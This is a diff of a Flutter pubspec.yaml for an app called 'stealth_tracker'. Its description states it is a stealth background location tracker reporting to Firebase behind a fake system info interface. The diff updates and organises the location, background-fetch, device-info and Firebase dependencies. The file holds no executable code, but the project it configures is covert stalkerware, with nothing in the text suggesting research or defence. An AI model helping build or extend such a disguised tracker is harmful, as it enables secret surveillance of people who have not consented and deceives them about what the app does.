@@ -1,6 +1,8 @@
 name: stealth_tracker
-description: A stealth background location tracker with Firebase.
-publish_to: 'none'
+description: A stealth background location tracker with Firebase and a fake system info UI.
+publish_to: 'none' # This is a private app
+
+version: 1.0.0+1
 
 environment:
   sdk: ">=3.0.0 <4.0.0"
@@ -8,13 +10,27 @@ environment:
 dependencies:
   flutter:
     sdk: flutter
-  firebase_core: ^2.0.0
-  firebase_database: ^10.0.0
-  geolocator: ^10.0.0
-  background_fetch: ^1.1.0
-  device_info_plus: ^9.0.2
-  battery_plus: ^4.0.2
+
+  # Firebase
+  firebase_core: ^2.27.0
+  firebase_database: ^10.4.0
+
+  # Location tracking
+  geolocator: ^10.1.0
+  background_fetch: ^1.2.0
+
+  # Device info and system stats
+  device_info_plus: ^9.1.2
+  battery_plus: ^4.1.0
   connectivity_plus: ^5.0.2
+
+  # UI
+  cupertino_icons: ^1.0.6
+
+dev_dependencies:
+  flutter_test:
+    sdk: flutter
+  flutter_lints: ^3.0.1
 
 flutter:
   uses-material-design: true
